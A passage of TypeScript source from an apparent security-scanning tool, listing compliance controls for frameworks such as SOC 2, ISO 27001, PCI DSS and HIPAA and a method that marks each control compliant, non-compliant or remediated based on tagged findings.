        { code: 'AC-3', name: 'Access Enforcement', description: 'Enforce approved authorizations for logical access to information.', category: 'Access Control', matchTags: ['AC-3', 'AC-2', 'AC-6'] },
        { code: 'IA-5', name: 'Authenticator Management', description: 'Protect authenticators and cryptographic keys against disclosure.', category: 'Identification', matchTags: ['IA-5', 'IA-2'] },
        { code: 'SI-10', name: 'Information Input Validation', description: 'Check data inputs for accuracy, syntax, and malicious injection payloads.', category: 'System Integrity', matchTags: ['SI-10', 'SI-7'] },
        { code: 'SC-8', name: 'Transmission Confidentiality & Integrity', description: 'Protect transmitted information from unauthorized disclosure using TLS.', category: 'Communications', matchTags: ['SC-8', 'SC-13', 'SC-28'] },
        { code: 'CM-7', name: 'Least Functionality', description: 'Configure containers and binaries to execute strictly with least required privileges.', category: 'Configuration', matchTags: ['CM-7', 'SI-2'] }
      ],
      'SOC2_TYPE_II': [
        { code: 'CC6.1', name: 'Logical Access Controls', description: 'Restricts access to data and system components to authorized identities.', category: 'Common Criteria', matchTags: ['CC6.1', 'CC6.2', 'CC6.3'] },
        { code: 'CC6.6', name: 'Boundary Protection & Network Controls', description: 'Protects network perimeters, API CORS boundaries, and transmission encryption.', category: 'Network Security', matchTags: ['CC6.6', 'CC6.7'] },
        { code: 'CC6.8', name: 'Malicious Software Prevention', description: 'Prevents and detects unauthorized code execution, injection, and deserialization.', category: 'Threat Defense', matchTags: ['CC6.8'] },
        { code: 'CC7.1', name: 'Vulnerability Management', description: 'Identifies, assesses, and remediates software vulnerabilities and outdated packages.', category: 'Operations', matchTags: ['CC7.1'] }
      ],
      'ISO_27001': [
        { code: 'A.8.28', name: 'Secure Coding', description: 'Applies secure coding principles to prevent injection and unauthorized execution.', category: 'Technological Controls', matchTags: ['A.8.28'] },
        { code: 'A.8.24', name: 'Use of Cryptography', description: 'Manages cryptographic keys and enforces end-to-end transport encryption.', category: 'Cryptography', matchTags: ['A.8.24'] },
        { code: 'A.8.8', name: 'Management of Technical Vulnerabilities', description: 'Evaluates exposure to vulnerabilities in third-party software components.', category: 'Vulnerabilities', matchTags: ['A.8.8'] },
        { code: 'A.8.9', name: 'Configuration Management', description: 'Hardens operating systems, containers, and binary execution parameters.', category: 'Configuration', matchTags: ['A.8.9', 'A.8.20'] }
      ],
      'PCI_DSS_V4': [
        { code: 'Req 6.5.1', name: 'Injection Flaws', description: 'Address injection vulnerabilities including SQL, OS command, and dynamic code.', category: 'Software Development', matchTags: ['Req 6.5.1'] },
        { code: 'Req 6.5.7', name: 'Cross-Site Scripting (XSS)', description: 'Ensure all user input is sanitized before rendering in user interfaces.', category: 'Software Development', matchTags: ['Req 6.5.7'] },
        { code: 'Req 8.2', name: 'User Authentication & Key Management', description: 'Protect cardholder secrets and eliminate hardcoded keys in software.', category: 'Identity & Access', matchTags: ['Req 8.2', 'Req 8.2.1', 'Req 8.3'] },
        { code: 'Req 4.1', name: 'Cardholder Data Transmission Protection', description: 'Mandate strong cryptography and security protocols during public transmission.', category: 'Data Protection', matchTags: ['Req 4.1'] }
      ],
      'HIPAA': [
        { code: '164.312(a)(1)', name: 'Access Control Standard', description: 'Implements technical policies to allow access only to authorized workforce members.', category: 'Technical Safeguards', matchTags: ['164.312(a)(1)'] },
        { code: '164.312(a)(2)(i)', name: 'Unique User Identification', description: 'Assigns unique names/numbers for tracking user identity and privileges.', category: 'Access Control', matchTags: ['164.312(a)(2)(i)'] },
        { code: '164.312(e)(1)', name: 'Transmission Security', description: 'Guards ePHI against unauthorized access when transmitted over networks.', category: 'Technical Safeguards', matchTags: ['164.312(e)(1)'] },
        { code: '164.312(d)', name: 'Person or Entity Authentication', description: 'Implements procedures to verify identity and eliminate leaked credentials.', category: 'Authentication', matchTags: ['164.312(d)'] }
      ]
    };

    const reqList = baseRequirements[framework] || baseRequirements['OWASP_TOP_10'];

    return reqList.map((req, idx) => {
      const activeViolations = findings.filter(f => {
        if (f.status === 'VERIFIED_RESOLVED' || f.status === 'FALSE_POSITIVE') return false;
        const tags = Object.values(f.complianceTags || {}).flat();
        return tags.some(t => req.matchTags.some(mt => t.includes(mt) || mt.includes(t)));
      });

      const resolvedViolations = findings.filter(f => {
        if (f.status !== 'VERIFIED_RESOLVED') return false;
        const tags = Object.values(f.complianceTags || {}).flat();
        return tags.some(t => req.matchTags.some(mt => t.includes(mt) || mt.includes(t)));
      });

      let status: 'COMPLIANT' | 'NON_COMPLIANT' | 'REMEDIATED' = 'COMPLIANT';
      if (activeViolations.length > 0) {
        status = 'NON_COMPLIANT';
      } else if (resolvedViolations.length > 0) {
        status = 'REMEDIATED';
      }

      return {
        id: `comp-${framework.toLowerCase()}-${idx + 1}`,
        code: req.code,
        name: req.name,
        description: req.description,
        category: req.category,
        framework,
        findingsAffected: activeViolations.map(f => f.id).concat(resolvedViolations.map(f => f.id)),
        status
      };
    });
  }
}
